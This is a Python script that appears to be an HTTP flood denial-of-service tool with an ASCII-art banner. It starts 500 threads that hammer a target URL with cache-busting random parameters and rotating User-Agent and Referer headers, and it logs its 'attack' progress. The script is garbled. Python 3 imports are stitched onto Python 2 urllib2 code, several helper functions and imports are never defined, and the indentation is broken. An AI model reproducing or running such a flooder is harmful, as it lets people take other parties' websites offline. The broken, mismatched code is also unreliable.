# -*- coding: utf-8 -*-
#! /usr/bin/python3.11

import time
import datetime
import asyncio
from collections import Counter
from statistics import mean
from urllib.parse import urlparse
from sys import stdout
import logging
import contextlib

import validators
import aiohttp
from colorama import Fore, Style, init


# Init color & logging
init(autoreset=True)
logging.basicConfig(
    filename='attack.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)


def log_attack_status(message, level='info', print_to_terminal=True):
    if level == 'info':
        logging.info(message)
        if print_to_terminal:
            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
    elif level == 'error':
        logging.error(message)
        if print_to_terminal:
            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
    elif level == 'warning':
        logging.warning(message)
        if print_to_terminal:
            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")


def display_header():
    header_lines = [
        f"{Fore.GREEN}══════════════════════════════════════════════════════════════════════════",
        f"{Fore.YELLOW}",
        f"{Fore.YELLOW} ██████▒▒   ██▒▒                 ██████▒▒ ██▒▒   ██▒▒",
        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒  ██▒▒",
        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒                ██▒▒      ██▒▒ ██▒▒",
        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒        {Fore.RED}█▒▒     {Fore.YELLOW}██▒▒      ██▒▒██▒▒",
        f"{Fore.YELLOW} █████▒▒    ██▒▒       {Fore.RED}███▒▒    {Fore.YELLOW}██▒▒      ██▒██▒▒",
        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒      {Fore.RED}██▒██▒▒   {Fore.YELLOW}██▒▒      ██▒▒██▒▒ ",
        f"{Fore.YELLOW} ██▒▒   ██▒▒██▒▒     {Fore.RED}██▒▒ ██▒▒  {Fore.YELLOW}██▒▒      ██▒▒ ██▒▒",
        f"{Fore.YELLOW} ██████▒▒   ██████▒▒{Fore.RED}██▒▒   ██▒▒  {Fore.YELLOW}██████▒▒ ██▒▒   ██▒▒",
        f"{Fore.RED}                   {Fore.RED}██▒▒     ██▒▒    {Fore.GREEN}███████▒▒  ████▒▒     ████▒██▒▒       ██▒▒",
        f"{Fore.RED}                  {Fore.RED}████████▒▒ ██▒▒   {Fore.GREEN}██▒▒   ██▒▒██▒██▒▒   ██▒██▒▒██▒▒     ██▒▒",
        f"{Fore.RED}                 {Fore.RED}██▒▒         ██▒▒  {Fore.GREEN}██▒▒   ██▒▒██▒▒██▒▒ ██▒▒██▒▒ ██▒▒   ██▒▒",
        f"{Fore.RED}                {Fore.RED}██▒▒           ██▒▒ {Fore.GREEN}██▒▒   ██▒▒██▒▒ ██▒██▒▒ ██▒▒  ██▒▒ ██▒▒",
        f"{Fore.GREEN}               {Fore.RED}██▒▒             ██▒▒{Fore.GREEN}██▒▒   ██▒▒██▒▒  ███▒▒  ██▒▒   ██▒██▒▒",
        f"{Fore.GREEN}                                    ██████▒▒   ██▒▒   ██▒▒  ██▒▒    ███▒▒",
        f"{Fore.GREEN}                                    ██▒▒ ██▒▒  ██▒▒         ██▒▒     ██▒▒",
        f"{Fore.GREEN}                                    ██▒▒   ██▒▒██▒▒         ██▒▒     ██▒▒",
        f"{Fore.GREEN}",
        f"{Fore.GREEN} ",    
        f"{Fore.RED}    █████▒▒  ███▒▒   ██▒▒   ██▒▒ █▒▒  █▒▒ ██▒▒ █▒▒ █▒▒███████▒▒ █▒▒   █▒▒",
        f"{Fore.RED}   █▒▒      █▒▒  █▒▒ █▒█▒▒ █▒█▒▒ █▒▒  █▒▒ █▒█▒▒█▒▒ █▒▒   █▒▒     █▒▒ █▒▒",
        f"{Fore.WHITE}   █▒▒      █▒▒  █▒▒ █▒▒█▒█▒▒█▒▒ █▒▒  █▒▒ █▒▒█▒█▒▒ █▒▒   █▒▒      ██▒▒",
        f"{Fore.WHITE}    ████▒▒   ███▒▒   █▒▒██▒▒ █▒▒  ███▒▒   █▒▒ ██▒▒ █▒▒   █▒▒       █▒▒",
        f"{Fore.WHITE}",      
        f"{Fore.YELLOW}════════════════════════════════════════════════════════════════════════════",
    ]
    for line in header_lines:
        print(line)
    # Versi dan URL
    print(f"{Fore.WHITE}{Style.BRIGHT}{' ' * 57}v.1.0")
    print(f"{Fore.CYAN}{Style.BRIGHT}{' ' * 16}https://kunkaffa@gmail.com")
    print(f"{Fore.CYAN}|{'=' * 74}|")

def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print("")
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+500<request_counter) & (previous<>request_counter):
				print "%d ATTACKED THE SERVER -->" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- Attack Finished --"


if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "ATTACK STARTED"
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
